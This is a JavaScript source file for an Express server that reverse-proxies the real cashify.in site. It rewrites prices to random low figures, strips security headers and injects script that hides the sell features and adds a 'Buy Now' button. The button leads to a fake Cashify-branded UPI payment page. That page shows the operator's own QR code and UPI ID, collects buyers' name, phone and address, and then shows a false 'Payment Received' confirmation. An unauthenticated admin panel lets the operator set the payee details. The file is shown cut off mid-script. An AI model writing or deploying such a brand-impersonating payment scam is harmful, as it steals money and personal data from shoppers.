import express from "express";
import { createProxyMiddleware, responseInterceptor } from "http-proxy-middleware";
import cors from "cors";
import { fileURLToPath } from "url";
import path from "path";
import fs from "fs";
import multer from "multer";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── Config store (QR + UPI ID) ───────────────────────────────────────────────
const CONFIG_FILE = path.join(__dirname, "public", "payment-config.json");

function loadConfig() {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      return JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
    }
  } catch (e) {}
  return { upiId: "yourname@upi", qrFile: null };
}

function saveConfig(data) {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(data, null, 2));
}

// ─── Multer — QR image upload to /public ──────────────────────────────────────
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, path.join(__dirname, "public")),
  filename:    (req, file, cb) => cb(null, "qr.png"),   // always overwrite as qr.png
});
const upload = multer({
  storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith("image/")) cb(null, true);
    else cb(new Error("Only images allowed"));
  },
  limits: { fileSize: 5 * 1024 * 1024 },
});

// ─── Serve static files from /public ─────────────────────────────────────────
app.use("/public", express.static(path.join(__dirname, "public")));

// ─── ADMIN PANEL ──────────────────────────────────────────────────────────────
app.get("/admin", (req, res) => {
  const cfg = loadConfig();
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Admin Panel — Cashify</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>body{font-family:'Inter',sans-serif;background:#0f172a;}</style>
</head>
<body class="min-h-screen flex items-center justify-center p-6">
  <div class="w-full max-w-lg">

    <!-- Header -->
    <div class="text-center mb-8">
      <div class="inline-flex items-center gap-2 bg-slate-800 rounded-full px-5 py-2 mb-3">
        <span class="text-2xl">⚙️</span>
        <span class="text-white font-bold text-lg">Admin Panel</span>
      </div>
      <p class="text-slate-400 text-sm">Manage payment QR code and UPI ID</p>
    </div>

    <!-- Status -->
    <div id="toast" class="hidden mb-4 p-3 rounded-xl text-sm font-semibold text-center"></div>

    <!-- Card -->
    <div class="bg-slate-800 rounded-2xl shadow-2xl overflow-hidden">

      <!-- Current Status -->
      <div class="bg-slate-700/50 px-6 py-4 border-b border-slate-700">
        <p class="text-xs text-slate-400 font-semibold uppercase tracking-wider mb-3">Current Settings</p>
        <div class="flex items-center gap-4">
          <div class="w-16 h-16 rounded-xl overflow-hidden bg-white flex items-center justify-center border-2 border-slate-600">
            ${cfg.qrFile
              ? `<img src="/public/qr.png?t=${Date.now()}" class="w-full h-full object-contain" onerror="this.parentElement.innerHTML='<span class=\\'text-xs text-gray-400\\'>No QR</span>'">`
              : `<span class="text-xs text-gray-400 text-center px-1">No QR</span>`}
          </div>
          <div>
            <p class="text-xs text-slate-400">UPI ID</p>
            <p class="text-white font-bold text-sm">${cfg.upiId || "Not set"}</p>
            <p class="text-xs text-slate-400 mt-1">QR Image</p>
            <p class="text-white text-sm">${cfg.qrFile ? "✅ Uploaded" : "❌ Not uploaded"}</p>
          </div>
        </div>
      </div>

      <div class="p-6 space-y-6">

        <!-- UPI ID Form -->
        <div>
          <label class="block text-sm font-semibold text-slate-300 mb-2">💳 UPI ID</label>
          <div class="flex gap-2">
            <input type="text" id="upiInput" value="${cfg.upiId || ""}"
              placeholder="e.g. yourname@jio"
              class="flex-1 bg-slate-700 border border-slate-600 text-white rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none placeholder-slate-500">
            <button onclick="saveUPI()"
              class="bg-blue-600 hover:bg-blue-700 active:scale-95 text-white font-bold px-5 py-3 rounded-xl text-sm transition-all">
              Save
            </button>
          </div>
        </div>

        <!-- QR Upload Form -->
        <div>
          <label class="block text-sm font-semibold text-slate-300 mb-2">📷 QR Code Image</label>
          <div id="dropzone"
            class="border-2 border-dashed border-slate-600 rounded-xl p-6 text-center cursor-pointer hover:border-blue-500 transition-colors"
            onclick="document.getElementById('qrFile').click()"
            ondragover="event.preventDefault();this.classList.add('border-blue-500')"
            ondragleave="this.classList.remove('border-blue-500')"
            ondrop="handleDrop(event)">
            <div id="dropContent">
              <p class="text-3xl mb-2">📤</p>
              <p class="text-slate-300 font-semibold text-sm">Click or drag & drop QR image</p>
              <p class="text-slate-500 text-xs mt-1">PNG, JPG up to 5MB</p>
            </div>
          </div>
          <input type="file" id="qrFile" accept="image/*" class="hidden" onchange="previewAndUpload(this.files[0])">
        </div>

        <!-- Preview -->
        <div id="previewBox" class="hidden">
          <label class="block text-sm font-semibold text-slate-300 mb-2">Preview</label>
          <div class="flex items-center gap-4 bg-slate-700/50 rounded-xl p-4">
            <img id="previewImg" class="w-20 h-20 object-contain rounded-lg bg-white p-1">
            <div class="flex-1">
              <p id="previewName" class="text-white text-sm font-semibold"></p>
              <p id="previewSize" class="text-slate-400 text-xs mt-1"></p>
            </div>
            <button onclick="uploadQR()"
              class="bg-green-500 hover:bg-green-600 active:scale-95 text-white font-bold px-4 py-2 rounded-xl text-sm transition-all">
              Upload ✓
            </button>
          </div>
        </div>

      </div>
    </div>

    <p class="text-center text-slate-600 text-xs mt-4">
      <a href="/payment" class="hover:text-slate-400 transition-colors">View Payment Page →</a>
    </p>
  </div>

  <script>
    let selectedFile = null;

    function showToast(msg, ok) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.className = 'mb-4 p-3 rounded-xl text-sm font-semibold text-center ' +
        (ok ? 'bg-green-500/20 text-green-400 border border-green-500/30'
             : 'bg-red-500/20 text-red-400 border border-red-500/30');
      t.classList.remove('hidden');
      setTimeout(() => t.classList.add('hidden'), 3000);
    }

    async function saveUPI() {
      const upi = document.getElementById('upiInput').value.trim();
      if (!upi) return showToast('UPI ID cannot be empty', false);
      const r = await fetch('/admin/save-upi', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ upiId: upi })
      });
      const d = await r.json();
      if (d.ok) showToast('✅ UPI ID saved! Reload payment page to see changes.', true);
      else showToast('❌ Failed to save', false);
    }

    function handleDrop(e) {
      e.preventDefault();
      document.getElementById('dropzone').classList.remove('border-blue-500');
      const file = e.dataTransfer.files[0];
      if (file) previewAndUpload(file);
    }

    function previewAndUpload(file) {
      if (!file) return;
      selectedFile = file;
      const reader = new FileReader();
      reader.onload = (e) => {
        document.getElementById('previewImg').src = e.target.result;
        document.getElementById('previewName').textContent = file.name;
        document.getElementById('previewSize').textContent = (file.size/1024).toFixed(1) + ' KB';
        document.getElementById('previewBox').classList.remove('hidden');
      };
      reader.readAsDataURL(file);
    }

    async function uploadQR() {
      if (!selectedFile) return;
      const fd = new FormData();
      fd.append('qr', selectedFile);
      const r = await fetch('/admin/upload-qr', { method: 'POST', body: fd });
      const d = await r.json();
      if (d.ok) {
        showToast('✅ QR uploaded! Payment page updated.', true);
        setTimeout(() => location.reload(), 1500);
      } else {
        showToast('❌ Upload failed: ' + (d.error || 'unknown'), false);
      }
    }
  </script>
</body>
</html>`);
});

// ─── Admin API: Save UPI ID ───────────────────────────────────────────────────
app.post("/admin/save-upi", (req, res) => {
  const { upiId } = req.body;
  if (!upiId) return res.json({ ok: false, error: "UPI ID required" });
  const cfg = loadConfig();
  cfg.upiId = upiId.trim();
  saveConfig(cfg);
  res.json({ ok: true });
});

// ─── Admin API: Upload QR Image ───────────────────────────────────────────────
app.post("/admin/upload-qr", upload.single("qr"), (req, res) => {
  if (!req.file) return res.json({ ok: false, error: "No file received" });
  const cfg = loadConfig();
  cfg.qrFile = "qr.png";
  saveConfig(cfg);
  res.json({ ok: true, file: req.file.filename });
});


// ─── Custom Payment Page ──────────────────────────────────────────────────────
app.use("/payment", (req, res) => {
  const cfg = loadConfig();
  const upiId  = cfg.upiId  || "yourname@upi";
  const qrSrc  = cfg.qrFile ? `/public/qr.png?t=${Date.now()}` : null;
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Secure Payment - Cashify</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
        <style>
          body { font-family: 'Inter', sans-serif; background: #f0f4ff; }
          .step-active  { background: #1B4FD8; color: white; }
          .step-done    { background: #22c55e; color: white; }
          .step-inactive{ background: #e2e8f0; color: #94a3b8; }
          .qr-wrap {
            background: linear-gradient(145deg, #e0f0ff, #c7d9ff);
            border: 3px solid #1B4FD8;
            border-radius: 20px;
            padding: 16px;
            display: inline-block;
          }
          .pulse { animation: pulse 2s infinite; }
          @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
          .timer-bar { transition: width 1s linear; }
        </style>
      </head>
      <body class="min-h-screen flex flex-col items-center justify-center p-4">

        <div class="w-full max-w-md">

          <!-- Cashify Branding -->
          <div class="text-center mb-4">
            <div class="inline-flex items-center gap-2 bg-white rounded-full px-4 py-2 shadow-sm border">
              <svg width="22" height="22" viewBox="0 0 40 40"><circle cx="20" cy="20" r="20" fill="#00c2a8"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="white" font-size="18" font-weight="bold">C</text></svg>
              <span class="font-bold text-gray-800 text-lg">Cashify</span>
              <span class="text-xs bg-green-100 text-green-700 px-2 py-0.5 rounded-full font-semibold">Secure Pay</span>
            </div>
          </div>

          <!-- Card -->
          <div class="bg-white rounded-3xl shadow-2xl overflow-hidden">

            <!-- Progress Steps -->
            <div class="bg-gradient-to-r from-blue-600 to-blue-500 px-6 pt-5 pb-4">
              <div class="flex items-center justify-between">
                <div class="flex flex-col items-center">
                  <div class="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm step-active" id="s1-icon">1</div>
                  <span class="text-xs mt-1 text-blue-100 font-medium">Details</span>
                </div>
                <div class="flex-1 h-0.5 bg-blue-400 mx-2" id="line1"></div>
                <div class="flex flex-col items-center">
                  <div class="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm step-inactive" id="s2-icon">2</div>
                  <span class="text-xs mt-1 text-blue-200 font-medium">Payment</span>
                </div>
                <div class="flex-1 h-0.5 bg-blue-400 mx-2" id="line2"></div>
                <div class="flex flex-col items-center">
                  <div class="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm step-inactive" id="s3-icon">✓</div>
                  <span class="text-xs mt-1 text-blue-200 font-medium">Done</span>
                </div>
              </div>
            </div>

            <div class="p-6">

              <!-- ── STEP 1: Details ── -->
              <div id="step1">
                <h2 class="text-lg font-bold text-gray-800 mb-1">Order Summary</h2>
                <p class="text-sm text-gray-400 mb-4">Confirm your details to proceed</p>

                <!-- Product row -->
                <div class="flex items-center gap-3 bg-blue-50 rounded-xl p-3 mb-4 border border-blue-100">
                  <div class="w-12 h-12 bg-white rounded-lg flex items-center justify-center shadow-sm text-2xl">📱</div>
                  <div class="flex-1">
                    <p class="font-semibold text-gray-800 text-sm">Refurbished Smartphone</p>
                    <p class="text-xs text-gray-400">Grade A • 6 months warranty</p>
                  </div>
                  <span class="font-bold text-blue-600 text-lg">₹499</span>
                </div>

                <div class="space-y-3">
                  <div>
                    <label class="block text-xs font-semibold text-gray-500 mb-1">Full Name</label>
                    <input type="text" id="inp-name" class="w-full border border-gray-200 rounded-xl p-3 text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 outline-none" placeholder="Enter your name">
                  </div>
                  <div>
                    <label class="block text-xs font-semibold text-gray-500 mb-1">Phone Number</label>
                    <input type="tel" id="inp-phone" class="w-full border border-gray-200 rounded-xl p-3 text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 outline-none" placeholder="+91 XXXXX XXXXX">
                  </div>
                  <div>
                    <label class="block text-xs font-semibold text-gray-500 mb-1">Delivery Address</label>
                    <input type="text" id="inp-addr" class="w-full border border-gray-200 rounded-xl p-3 text-sm bg-gray-50 focus:ring-2 focus:ring-blue-400 outline-none" placeholder="House no, Street, City">
                  </div>
                </div>

                <button onclick="nextStep(2)" class="w-full mt-5 bg-blue-600 hover:bg-blue-700 active:scale-95 text-white font-bold py-3.5 rounded-xl transition-all text-sm shadow-lg shadow-blue-200">
                  Continue to Payment →
                </button>
              </div>

              <!-- ── STEP 2: Payment ── -->
              <div id="step2" class="hidden">
                <h2 class="text-lg font-bold text-gray-800 mb-1">Pay via UPI</h2>
                <p class="text-sm text-gray-400 mb-4">Scan QR or use UPI ID below</p>

                <!-- Timer -->
                <div class="flex items-center justify-between text-xs text-gray-400 mb-2">
                  <span>Session expires in</span>
                  <span class="font-bold text-orange-500" id="timer">09:59</span>
                </div>
                <div class="w-full bg-gray-100 rounded-full h-1 mb-4">
                  <div id="timer-bar" class="timer-bar bg-orange-400 h-1 rounded-full" style="width:100%"></div>
                </div>

                <!-- QR Code -->
                <div class="flex flex-col items-center mb-4">
                  <div class="qr-wrap shadow-lg">
                    ${qrSrc
                      ? `<img src="${qrSrc}" alt="UPI QR Code" class="w-52 h-52 object-contain rounded-xl">`
                      : `<div class="w-52 h-52 flex flex-col items-center justify-center bg-white rounded-xl gap-2">
                           <svg class="w-16 h-16 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1" stroke-width="2"/><rect x="14" y="3" width="7" height="7" rx="1" stroke-width="2"/><rect x="3" y="14" width="7" height="7" rx="1" stroke-width="2"/><path d="M14 14h2v2h-2zM18 14h3M14 18h3M18 18h3M18 21v-3" stroke-width="2"/></svg>
                           <p class="text-xs text-gray-400 text-center px-2">QR not set.<br>Upload via Admin Panel</p>
                         </div>`
                    }
                  </div>
                  <div class="mt-3 flex items-center gap-2 bg-gray-50 border rounded-xl px-4 py-2">
                    <span class="text-xs text-gray-500">UPI ID:</span>
                    <span class="text-sm font-bold text-gray-800" id="upi-id">${upiId}</span>
                    <button onclick="copyUPI()" class="text-blue-500 hover:text-blue-700 ml-1" title="Copy">
                      <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg>
                    </button>
                  </div>
                </div>

                <!-- Amount -->
                <div class="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100 rounded-xl p-4 flex justify-between items-center mb-4">
                  <div>
                    <p class="text-xs text-gray-400">Total Amount</p>
                    <p class="text-2xl font-bold text-blue-600">₹499</p>
                  </div>
                  <div class="text-right">
                    <p class="text-xs text-gray-400">Payment to</p>
                    <p class="text-sm font-semibold text-gray-700">Cashify Store</p>
                  </div>
                </div>

                <!-- Apps row -->
                <div class="flex justify-center gap-4 mb-5">
                  <div class="flex flex-col items-center gap-1 opacity-70">
                    <div class="w-10 h-10 bg-white rounded-xl shadow flex items-center justify-center text-xl">🟢</div>
                    <span class="text-xs text-gray-400">PhonePe</span>
                  </div>
                  <div class="flex flex-col items-center gap-1 opacity-70">
                    <div class="w-10 h-10 bg-white rounded-xl shadow flex items-center justify-center text-xl">🔵</div>
                    <span class="text-xs text-gray-400">GPay</span>
                  </div>
                  <div class="flex flex-col items-center gap-1 opacity-70">
                    <div class="w-10 h-10 bg-white rounded-xl shadow flex items-center justify-center text-xl">🟣</div>
                    <span class="text-xs text-gray-400">Paytm</span>
                  </div>
                  <div class="flex flex-col items-center gap-1 opacity-70">
                    <div class="w-10 h-10 bg-white rounded-xl shadow flex items-center justify-center text-xl">🔴</div>
                    <span class="text-xs text-gray-400">BHIM</span>
                  </div>
                </div>

                <div class="flex gap-3">
                  <button onclick="nextStep(1)" class="w-1/3 bg-gray-100 hover:bg-gray-200 text-gray-600 font-semibold py-3 rounded-xl text-sm transition-all">← Back</button>
                  <button onclick="nextStep(3)" class="w-2/3 bg-green-500 hover:bg-green-600 active:scale-95 text-white font-bold py-3 rounded-xl text-sm transition-all shadow-lg shadow-green-200 pulse">
                    ✓ I've Paid
                  </button>
                </div>
              </div>

              <!-- ── STEP 3: Done ── -->
              <div id="step3" class="hidden text-center py-6">
                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 shadow-inner">
                  <svg class="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/>
                  </svg>
                </div>
                <h2 class="text-2xl font-bold text-gray-800 mb-1">Payment Received! 🎉</h2>
                <p class="text-gray-400 text-sm mb-2">Your order has been confirmed.</p>
                <p class="text-xs text-gray-300 mb-6">Order ID: #CSF<span id="order-id"></span></p>
                <div class="bg-green-50 border border-green-100 rounded-xl p-4 text-left mb-6">
                  <p class="text-xs font-semibold text-green-700 mb-1">📦 What's next?</p>
                  <p class="text-xs text-gray-500">Our team will contact you within 24 hours to confirm delivery details.</p>
                </div>
                <a href="/" class="inline-block text-blue-600 font-semibold text-sm hover:underline">← Continue Shopping</a>
              </div>

            </div>
          </div>

          <!-- Trust badges -->
          <div class="flex justify-center gap-6 mt-4 text-xs text-gray-400">
            <span>🔒 SSL Secured</span>
            <span>✅ Verified Seller</span>
            <span>↩️ Easy Returns</span>
          </div>
        </div>

        <script>
          // Generate random order ID
          document.getElementById('order-id').textContent = Math.floor(100000 + Math.random() * 900000);

          function nextStep(step) {
            [1,2,3].forEach(i => {
              document.getElementById('step' + i).classList.add('hidden');
              document.getElementById('s' + i + '-icon').className =
                'w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm step-inactive';
            });
            document.getElementById('step' + step).classList.remove('hidden');
            for (let i = 1; i <= step; i++) {
              document.getElementById('s' + i + '-icon').className =
                'w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm ' +
                (i < step ? 'step-done' : 'step-active');
            }
            if (step === 2) startTimer();
          }

          // Countdown timer
          function startTimer() {
            let secs = 599;
            const timerEl = document.getElementById('timer');
            const barEl   = document.getElementById('timer-bar');
            const iv = setInterval(() => {
              if (secs <= 0) { clearInterval(iv); return; }
              secs--;
              const m = String(Math.floor(secs / 60)).padStart(2, '0');
              const s = String(secs % 60).padStart(2, '0');
              timerEl.textContent = m + ':' + s;
              barEl.style.width = (secs / 599 * 100) + '%';
            }, 1000);
          }

          // Copy UPI ID
          function copyUPI() {
            const upi = document.getElementById('upi-id').textContent;
            navigator.clipboard.writeText(upi).then(() => {
              const btn = event.currentTarget;
              btn.innerHTML = '<svg class="w-4 h-4 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>';
              setTimeout(() => {
                btn.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg>';
              }, 2000);
            });
          }
        </script>
      </body>
      </html>
    `);
});

// ─── Reverse Proxy → cashify.in ──────────────────────────────────────────────
// Baaki sab routes real cashify.in pe forward karo
app.use(
  "/",
  createProxyMiddleware({
    target: "https://www.cashify.in",
    changeOrigin: true,
    secure: true,
    followRedirects: true,
    selfHandleResponse: true,
    on: {
      proxyReq: (proxyReq, req) => {
        // Browser jaise lagao — block na ho
        proxyReq.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
        proxyReq.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
        proxyReq.setHeader("Accept-Language", "en-US,en;q=0.9");
        proxyReq.setHeader("Referer", "https://www.cashify.in/");
        // Enforce uncompressed response so we can modify HTML
        proxyReq.removeHeader("Accept-Encoding");
        console.log(`[proxy] → ${req.method} ${req.url}`);
      },
      proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
        const contentType = proxyRes.headers["content-type"] || "";
        
        // Remove CSP headers so our page loads fine
        res.removeHeader("content-security-policy");
        res.removeHeader("x-frame-options");

        if (contentType.includes("text/html") || contentType.includes("application/json")) {
          let text = responseBuffer.toString('utf8');

          // Fixed price pool — all under ₹1000
          const PRICES = [300, 349, 399, 450, 499, 549, 567, 599, 649, 699, 749, 799, 849, 899, 949, 999];
          const randPrice = () => PRICES[Math.floor(Math.random() * PRICES.length)];

          // 1. ONLY replace named price fields — never bare numbers (avoids breaking layout/IDs)
          const priceFields = 'price|amount|offerPrice|sellPrice|originalPrice|maxPrice|minPrice|marketPrice|listingPrice|discountedPrice|mrp|sp|cp|salePrice|basePrice|finalPrice|cashbackAmount';
          text = text.replace(new RegExp(`"(${priceFields})"\\s*:\\s*([1-9][\\d]{2,})`, 'gi'), (match, p1) => {
             return `"${p1}": ${randPrice()}`;
          });
          text = text.replace(new RegExp(`"(${priceFields})"\\s*:\\s*"([1-9][\\d]{2,})"`, 'gi'), (match, p1) => {
             return `"${p1}": "${randPrice()}"`;
          });

          // 2. Safe JSON replacements for display texts (avoids URLs/IDs)
          for(let i=0; i<3; i++) {
            text = text.replace(/"(title|name|description|seoTitle|heading|subHeading|label|text|buttonText)"\s*:\s*"([^"]*?)\bSell\b([^"]*?)"/gi, '"$1": "$2Buy$3"');
            text = text.replace(/"(title|name|description|seoTitle|heading|subHeading|label|text|buttonText)"\s*:\s*"([^"]*?)\bSelling\b([^"]*?)"/gi, '"$1": "$2Buying$3"');
            text = text.replace(/"(title|name|description|seoTitle|heading|subHeading|label|text|buttonText)"\s*:\s*"([^"]*?)\bsell\b([^"]*?)"/gi, '"$1": "$2buy$3"');
          }

          if (contentType.includes("text/html")) {
             // 3. Bulletproof HTML Text Replacement (ignores scripts, styles, attributes)
             let parts = text.split(/(<[^>]*>)/);
             let inScript = false;
             for (let i = 0; i < parts.length; i++) {
                if (i % 2 === 1) { // It's an HTML tag
                    const tag = parts[i].toLowerCase();
                    if (tag.startsWith('<script') || tag.startsWith('<style')) {
                        inScript = true;
                    } else if (tag.startsWith('</script') || tag.startsWith('</style')) {
                        inScript = false;
                    }
                } else { // It's a Text Node
                    if (!inScript && parts[i].trim().length > 0) {
                        parts[i] = parts[i].replace(/\bSell\b/g, "Buy");
                        parts[i] = parts[i].replace(/\bsell\b/g, "buy");
                        parts[i] = parts[i].replace(/\bSelling\b/g, "Buying");
                        parts[i] = parts[i].replace(/\bselling\b/g, "buying");
                        parts[i] = parts[i].replace(/\bSELL\b/g, "BUY");
                        
                        // Only replace ₹ prefixed prices in HTML text nodes
                        parts[i] = parts[i].replace(/₹\s*[\d,]+/g, () => `₹${randPrice()}`);
                    }
                }
             }
             text = parts.join('');

             // 4. Inject aggressive client-side script
             const injectedScript = `
               <script>
                 (function() {
                   const PRICES = [300, 349, 399, 450, 499, 549, 567, 599, 649, 699, 749, 799, 849, 899, 949, 999];
                   // Stable price per original value so it doesn't flicker on re-render
                   const priceCache = {};
                   function fakePrice(original) {
                     if (!priceCache[original]) {
                       priceCache[original] = PRICES[Math.floor(Math.random() * PRICES.length)];
                     }
                     return priceCache[original];
                   }

                   // ── Walk every TEXT NODE in the DOM and replace prices ──
                   function processNode(node) {
                     if (node.nodeType === Node.TEXT_NODE) {
                       let val = node.nodeValue;
                       if (!val || !val.trim()) return;
                       val = val.replace(/₹\\s*([\\d,]+)/g, (m, num) => {
                         const n = parseInt(num.replace(/,/g, ''), 10);
                         if (isNaN(n) || n < 100) return m;
                         return '₹' + fakePrice(n);
                       });
                       if (node.nodeValue !== val) node.nodeValue = val;
                     } else if (
                       node.nodeType === Node.ELEMENT_NODE &&
                       node.tagName !== 'SCRIPT' &&
                       node.tagName !== 'STYLE' &&
                       node.tagName !== 'NOSCRIPT'
                     ) {
                       node.childNodes.forEach(processNode);
                     }
                   }

                   // ── AGGRESSIVE Sell removal — hide anything sell-related ──
                   function removeSellElements() {
                     // 0. ── Hide top homepage banner / carousel ──
                     // Target: div with style="min-height: 178px" which is the carousel wrapper
                     document.querySelectorAll('[style*="min-height: 178px"]').forEach(el => {
                       el.style.setProperty('display', 'none', 'important');
                     });
                     // Hide dot indicators below carousel
                     document.querySelectorAll('[class*="transition-transform"]').forEach(el => {
                       const aspectParent = el.closest('[style*="aspect-ratio: 2 / 1"]');
                       if (aspectParent) {
                         const wrapper = aspectParent.parentElement && aspectParent.parentElement.parentElement;
                         if (wrapper) wrapper.style.setProperty('display', 'none', 'important');
                       }
                     });

                     // 0b. ── Our Services: show only first 4 visible items ──
                     document.querySelectorAll('h2').forEach(h2 => {
                       const txt = (h2.innerText || h2.textContent || '').trim();

                       // Our Services: show only first 4 visible items
                       if (txt === 'Our Services') {
                         const grid = h2.parentElement && h2.parentElement.querySelector('.flex.flex-row.flex-wrap');
                         if (grid) {
                           const items = grid.querySelectorAll(':scope > div.w-1\\/4');
                           let shown = 0;
                           items.forEach(item => {
                             if (item.style.display === 'none' || item.style.getPropertyValue('display') === 'none') return;
                             if (shown < 4) { shown++; }
                             else { item.style.setProperty('display', 'none', 'important'); }
                           });
                         }
                       }

                       // "Sell Your Old Device Now" section — hide entire section
                       if (/sell your old device/i.test(txt)) {
                         let section = h2.closest('[class*="flex-col"]') || h2.parentElement;
                         // Walk up to find the section wrapper
                         for (let i = 0; i < 5; i++) {
                           if (!section || section.tagName === 'BODY') break;
                           if (section.querySelector('h2') === h2) {
                             section.style.setProperty('display', 'none', 'important');
                             break;
                           }
                           section = section.parentElement;
                         }
                       }
                     });

                     // 1. Hide elements whose visible text starts with "Sell"
                     document.querySelectorAll('a, button, [role="button"], li, span, div, p, h1, h2, h3, h4, label').forEach(el => {
                       const txt = (el.innerText || el.textContent || '').trim();
                       if (txt.length < 60 && /^sell\\b/i.test(txt)) {
                         const wrapper =
                           el.closest('li') ||
                           el.closest('[class*="sell" i]') ||
                           el.closest('[data-testid*="sell" i]') ||
                           el;
                         wrapper.style.setProperty('display', 'none', 'important');
                       }
                     });

                     // 2. Hide elements with sell-related class names
                     document.querySelectorAll('[class*="sell" i], [id*="sell" i], [data-testid*="sell" i], [href*="/sell" i]').forEach(el => {
                       // Don't hide if it's a large container (body/main/section)
                       const tag = el.tagName.toLowerCase();
                       if (!['body','main','section','article','html'].includes(tag)) {
                         el.style.setProperty('display', 'none', 'important');
                       }
                     });

                     // 3. Hide nav links whose href contains /sell
                     document.querySelectorAll('a[href*="/sell"], a[href*="sell-"]').forEach(el => {
                       const wrapper = el.closest('li') || el.closest('nav > *') || el;
                       wrapper.style.setProperty('display', 'none', 'important');
                     });
                   }

                   // ── Inject "Buy Now" button on product pages ──
                   let buyBtnInjected = false;
                   function injectBuyNowButton() {
                     // Only inject on product detail pages (URL has /buy/ or /refurbished/ or product slug pattern)
                     const url = window.location.pathname;
                     const isProductPage =
                       /\\/(buy|refurbished|new|recycle|repair)\\//i.test(url) ||
                       /\\/[a-z0-9-]+-price-in-india/i.test(url) ||
                       document.querySelector('[class*="product-detail" i], [class*="productDetail" i], [class*="pdp" i], [id*="pdp" i]');

                     if (!isProductPage || buyBtnInjected) return;

                     // Find the main CTA area — look for existing buy/add-to-cart buttons
                     const ctaSelectors = [
                       '[class*="addToCart" i]',
                       '[class*="add-to-cart" i]',
                       '[class*="buyNow" i]',
                       '[class*="buy-now" i]',
                       '[class*="cta" i]',
                       '[class*="action" i]',
                       '[class*="product-action" i]',
                       '[class*="productAction" i]',
                     ];

                     let anchor = null;
                     for (const sel of ctaSelectors) {
                       anchor = document.querySelector(sel);
                       if (anchor) break;
                     }

                     // Fallback: inject as floating button
                     const btn = document.createElement('div');
                     btn.id = '__cashify_buy_btn__';
                     btn.innerHTML = \`
                       <button onclick="window.location.href='/payment'" style="
                         position: fixed;
                         bottom: 24px;
                         left: 50%;
                         transform: translateX(-50%);
                         z-index: 999999;
                         background: linear-gradient(135deg, #1B4FD8, #2563eb);
                         color: white;
                         font-family: Inter, sans-serif;
                         font-size: 16px;
                         font-weight: 700;
                         padding: 16px 48px;
                         border-radius: 50px;
                         border: none;
                         cursor: pointer;
                         box-shadow: 0 8px 32px rgba(27,79,216,0.45);
                         letter-spacing: 0.3px;
                         white-space: nowrap;
                         animation: __buyPulse 2s infinite;
                       ">
                         🛒 Buy Now — Pay Securely
                       </button>
                       <style>
                         @keyframes __buyPulse {
                           0%,100% { box-shadow: 0 8px 32px rgba(27,79,216,0.45); }
                           50%     { box-shadow: 0 8px 48px rgba(27,79,216,0.75); }
                         }
                       </style>
                     \`;

                     if (anchor) {
                       // Insert right after the found CTA element
                       anchor.insertAdjacentElement('afterend', btn);
                     } else {
                       document.body.appendChild(btn);
                     }
                     buyBtnInjected = true;
                   }

                   // ── Run everything ──
                   function runAll() {
                     processNode(document.body);
                     removeSellElements();
                     hideLoginElements();
                     injectBuyNowButton();
                   }

                   if (document.body) runAll();
                   document.addEventListener('DOMContentLoaded', runAll);

                   // MutationObserver — catches React re-renders and lazy-loaded content
                   const observer = new MutationObserver(mutations => {
                     observer.disconnect();
                     mutations.forEach(m => {
                       m.addedNodes.forEach(processNode);
                       if (m.type === 'characterData') processNode(m.target);
                     });
                     removeSellElements();
                     injectBuyNowButton();
                     observer.observe(document.body, { childList: true, subtree: true, characterData: true });
                   });

                   document.addEventListener('DOMContentLoaded', () => {
                     runAll();
